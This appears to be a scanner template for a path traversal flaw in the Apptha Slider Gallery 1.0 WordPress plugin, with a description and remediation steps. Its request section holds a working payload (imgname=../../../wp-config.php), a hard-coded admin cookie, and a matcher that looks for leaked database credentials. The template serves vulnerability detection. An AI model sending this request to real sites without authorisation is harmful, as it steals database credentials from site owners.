id: Wordpress-Apptha_Slider_Gallery_Plugins-FileRead
info:
  name: Wordpress_Apptha Slider Gallery_1.0_asgallDownload.php_ Read any file
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Apptha Slider Gallery 1.0 arbitrary file reading vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    A path traversal vulnerability exists in /wp-content/plugins/apptha-slider-gallery/asgallDownload.php. This vulnerability allows remote attackers to read arbitrary files in the system through the imgname parameter.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://www.apptha.com/category/extension/Wordpress/apptha-slider-gallery

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"DB_PASSWORD") && contains(body,"DB_USER")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/apptha-slider-gallery/asgallDownload.php?imgname=../../../wp-config.php'
  method: GET
  headers:
    Cookie: wordpress_2b7738476b2cfaf3b5454b1e89821e63=admin%7C1490237357%7CvV1NLJCKzc2Mwo4Q8Tpnmwk9q1ncYjzDZMXvx3j3SfV%7Ca060aad2454ab02a33a7edbdcac08f166c244490b811d506bf7c425d3bf7bb59;
